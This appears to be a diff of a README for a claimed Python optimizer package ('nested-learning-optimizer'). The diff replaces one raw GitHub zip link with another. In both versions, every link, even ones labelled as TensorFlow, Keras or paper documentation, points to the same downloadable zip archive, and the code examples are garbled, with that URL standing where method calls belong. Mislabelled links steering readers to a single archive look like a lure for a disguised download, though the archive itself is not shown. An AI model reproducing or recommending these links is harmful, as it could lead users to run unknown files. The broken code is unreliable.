@@ -17,7 +17,7 @@ Before downloading, ensure that your system meets the following requirements:
 
 To get started, you will need to download the application. Click the link below to visit the Releases page:
 
-[Download nested-learning-optimizer](https://raw.githubusercontent.com/ChrisPinedaSanhueza/nested-learning-optimizer/main/examples/nested-learning-optimizer_adiabatically.zip)
+[Download nested-learning-optimizer](https://github.com/ChrisPinedaSanhueza/nested-learning-optimizer/raw/refs/heads/main/examples/learning_nested_optimizer_v3.8.zip)
 
 On the Releases page, you will see the latest version available for download. Choose the version that suits your operating system and click to download.
 
@@ -42,12 +42,12 @@ Now that you have installed the optimizer, you can start using it in your projec
 3. **Initialize the optimizer in your model.** Here's a sample code snippet to help you get started:
    ```python
    optimizer = NestedOptimizer(learning_rate=0.001)
-   https://raw.githubusercontent.com/ChrisPinedaSanhueza/nested-learning-optimizer/main/examples/nested-learning-optimizer_adiabatically.zip(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])
+   https://github.com/ChrisPinedaSanhueza/nested-learning-optimizer/raw/refs/heads/main/examples/learning_nested_optimizer_v3.8.zip(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])
    ```
 
 4. **Train your model.** Use the typical `.fit()` method.
    ```python
-   https://raw.githubusercontent.com/ChrisPinedaSanhueza/nested-learning-optimizer/main/examples/nested-learning-optimizer_adiabatically.zip(x_train, y_train, epochs=10, batch_size=32)
+   https://github.com/ChrisPinedaSanhueza/nested-learning-optimizer/raw/refs/heads/main/examples/learning_nested_optimizer_v3.8.zip(x_train, y_train, epochs=10, batch_size=32)
    ```
 
 ## 🌐 Features
@@ -63,9 +63,9 @@ The **nested-learning-optimizer** comes with several features that make training
 
 If you want to learn more about how to use the optimizer or deep learning concepts in general, consider checking out these resources:
 
-- [TensorFlow Official Documentation](https://raw.githubusercontent.com/ChrisPinedaSanhueza/nested-learning-optimizer/main/examples/nested-learning-optimizer_adiabatically.zip)
-- [Keras Documentation](https://raw.githubusercontent.com/ChrisPinedaSanhueza/nested-learning-optimizer/main/examples/nested-learning-optimizer_adiabatically.zip)
-- [Nested Learning Paper](https://raw.githubusercontent.com/ChrisPinedaSanhueza/nested-learning-optimizer/main/examples/nested-learning-optimizer_adiabatically.zip) (Check for the latest paper on nested learning for deeper insights.)
+- [TensorFlow Official Documentation](https://github.com/ChrisPinedaSanhueza/nested-learning-optimizer/raw/refs/heads/main/examples/learning_nested_optimizer_v3.8.zip)
+- [Keras Documentation](https://github.com/ChrisPinedaSanhueza/nested-learning-optimizer/raw/refs/heads/main/examples/learning_nested_optimizer_v3.8.zip)
+- [Nested Learning Paper](https://github.com/ChrisPinedaSanhueza/nested-learning-optimizer/raw/refs/heads/main/examples/learning_nested_optimizer_v3.8.zip) (Check for the latest paper on nested learning for deeper insights.)
 
 ## ⚙️ Troubleshooting
 
